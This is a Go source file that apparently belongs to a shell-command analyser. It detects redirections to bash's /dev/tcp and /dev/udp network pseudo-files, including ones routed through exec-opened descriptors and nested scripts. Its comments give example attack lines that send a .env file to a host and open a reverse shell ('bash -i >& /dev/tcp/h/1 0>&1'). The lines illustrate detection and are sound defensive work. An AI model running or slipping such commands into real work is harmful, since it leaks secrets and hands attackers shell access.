package shellcmd

import "strings"

// SocketRedirect is a redirection of a command to or from one of bash's network pseudo-files,
// /dev/tcp/host/port or /dev/udp/host/port: bash opens a connection instead of a file, so the
// command's output is sent to the host, or its input comes from it.
type SocketRedirect struct {
	// Path is the pseudo-file as written, without its quotes: /dev/tcp/host.example/4444, also
	// where the host or port depends on an expansion (/dev/tcp/$HOST/$PORT).
	Path string
	// Op is SocketWrite when the command's output goes to the host, SocketRead when its input
	// comes from it, and SocketReadWrite for a descriptor opened both ways (<>).
	Op SocketOp
}

// SocketOp is the direction of a socket redirection.
type SocketOp string

const (
	SocketWrite     SocketOp = "write"
	SocketRead      SocketOp = "read"
	SocketReadWrite SocketOp = "readwrite"
)

// socketRedirects returns, for each command of a command line, its redirections to or
// from a network pseudo-file. The result is parallel to commands, or nil when there is none.
//
// A command has one when a redirection of its own names the pseudo-file
// (`cat .env > /dev/tcp/host/4444`), and when it duplicates a descriptor that is open on one
// (`exec 3<>/dev/tcp/host/4444; cat .env >&3`): the exec has the redirection that opens the
// connection, the later command the one that uses it, in the direction it uses it. A standard
// output or input the command does not redirect itself goes where it is sent from outside
// (descriptorSocket): its output when it is the last stage of its pipeline, its input when it is
// the first. A descriptor whose number is not written as a number is not followed.
func socketRedirects(commands []Command) [][]SocketRedirect {
	var out [][]SocketRedirect
	// open are the descriptors bare execs redirected, in the order they ran.
	var open []openDescriptor
	for i := range commands {
		c := &commands[i]
		// Only a bare exec's redirections outlast the command: by any path, as every program.
		keeps := len(c.Argv) == 1 && programOf(commandBase(c.Argv[0])) == "exec"
		for k := range c.Redirects {
			r := &c.Redirects[k]
			found := SocketRedirect{Op: SocketWrite}
			kind := r.kind()
			switch kind {
			case redirHereDoc, redirHereString:
				continue
			case redirIn, redirDupIn:
				found.Op = SocketRead
			case redirInOut:
				found.Op = SocketReadWrite
			case redirDupOut:
				// A copy onto standard input reads from the socket (`bash -i >& /dev/tcp/h/1 0>&1`).
				if r.descriptor() == "0" {
					found.Op = SocketRead
				}
			}
			found.Path = redirectSocket(commands, open, i, k)
			if keeps {
				// An empty path closes the descriptor, or says it now names something else.
				open = append(open, openDescriptor{shell: c.shell, fd: r.descriptor(), from: c.Offset, to: c.execEnd, path: found.Path})
			}
			if found.Path == "" {
				continue
			}
			if out == nil {
				out = make([][]SocketRedirect, len(commands))
			}
			out[i] = append(out[i], found)
		}
		if keeps || len(c.Argv) == 0 {
			continue
		}
		for _, std := range [...]struct {
			fd string
			op SocketOp
		}{{"1", SocketWrite}, {"0", SocketRead}} {
			if lastRedirect(c, std.fd, len(c.Redirects)) >= 0 {
				continue
			}
			path := descriptorSocket(commands, open, i, std.fd)
			if path == "" {
				continue
			}
			if out == nil {
				out = make([][]SocketRedirect, len(commands))
			}
			out[i] = append(out[i], SocketRedirect{Path: path, Op: std.op})
		}
	}
	return out
}

// openDescriptor is a descriptor a bare exec redirected: in the shell that ran it (shell, as
// Command.shell), from the exec's offset to the end of its subshell or substitution (to, 0 for
// none), on the network pseudo-file path, or on no socket when path is empty.
type openDescriptor struct {
	shell    int32
	fd       string
	from, to int
	path     string
}

// redirectSocket returns the socket redirection k of command i opens its descriptor on: the
// pseudo-file it names, or, for a duplication (>&3, <&3), the socket the descriptor it copies is
// open on there, as the redirections before it left it (`exec 3<>/dev/tcp/h/1 >&3`) or else as it
// is open outside the command (descriptorSocket).
func redirectSocket(commands []Command, open []openDescriptor, i, k int) string {
	r := &commands[i].Redirects[k]
	target := r.Target.Unquoted
	switch kind := r.kind(); {
	case (kind == redirDupOut || kind == redirDupIn) && isDescriptor(target):
		number := strings.TrimSuffix(target, "-")
		if earlier := lastRedirect(&commands[i], number, k); earlier >= 0 {
			return redirectSocket(commands, open, i, earlier)
		}
		return descriptorSocket(commands, open, i, number)
	case isSocketPath(target):
		return target
	}
	return ""
}

// descriptorSocket returns the socket command i's descriptor fd is open on when the command does
// not redirect it itself: where the innermost compound statement around it that redirects fd
// sends it (`{ cat .env; } > /dev/tcp/host/4444`, `{ ..; } >&3`), or else where the last bare exec
// before it in its subshell or substitution, or in one around that, left it (`exec
// >/dev/tcp/host/4444; cat .env`, `(exec 3>/dev/tcp/h/1; (cat .env >&3))`), or else, for a
// command of a script, where the shell running the script has it (`bash -c 'cat .env' >
// /dev/tcp/host/4444`), and so on out to the command line. Standard output is the stream only for
// a last stage of a pipeline outside a substitution, whose commands write the substitution's
// value, and standard input only for a first stage.
func descriptorSocket(commands []Command, open []openDescriptor, i int, fd string) string {
	for {
		c := &commands[i]
		for k := c.outer; k != 0; k = commands[k-1].outer {
			compound := &commands[k-1]
			if c.Pipeline != compound.Pipeline && (fd == "1" && !isLastStage(commands, i) || fd == "0" && c.Stage > 0) {
				return "" // its own pipeline takes the descriptor
			}
			if r := lastRedirect(compound, fd, len(compound.Redirects)); r >= 0 {
				return redirectSocket(commands, open, int(k-1), r)
			}
		}
		if fd == "1" && (c.within != 0 || !isLastStage(commands, i)) || fd == "0" && c.Stage > 0 {
			return ""
		}
		for k := len(open) - 1; k >= 0; k-- {
			if o := &open[k]; o.shell == c.shell && o.fd == fd && o.from < c.Offset && (o.to == 0 || c.Offset < o.to) {
				return o.path
			}
		}
		if c.shell == 0 {
			return ""
		}
		// A command of a script: the descriptor is the shell's, as the shell's command has it.
		i = int(c.shell) - 1
		if r := lastRedirect(&commands[i], fd, len(commands[i].Redirects)); r >= 0 {
			return redirectSocket(commands, open, i, r)
		}
	}
}

// lastRedirect returns the index of the last of the first n redirections of c that redirects
// descriptor fd, or -1.
func lastRedirect(c *Command, fd string, n int) int {
	for k := n - 1; k >= 0; k-- {
		if c.Redirects[k].descriptor() == fd {
			return k
		}
	}
	return -1
}

// isLastStage reports whether no later stage of command i's pipeline takes its output.
func isLastStage(commands []Command, i int) bool {
	c := &commands[i]
	for k := range commands {
		if later := &commands[k]; later.Pipeline == c.Pipeline && later.Stage > c.Stage {
			return false
		}
	}
	return true
}

// isSocketPath reports whether a redirection's target, as written, is a network pseudo-file.
func isSocketPath(target string) bool {
	rest, ok := strings.CutPrefix(target, "/dev/tcp/")
	if !ok {
		rest, ok = strings.CutPrefix(target, "/dev/udp/")
	}
	return ok && rest != ""
}
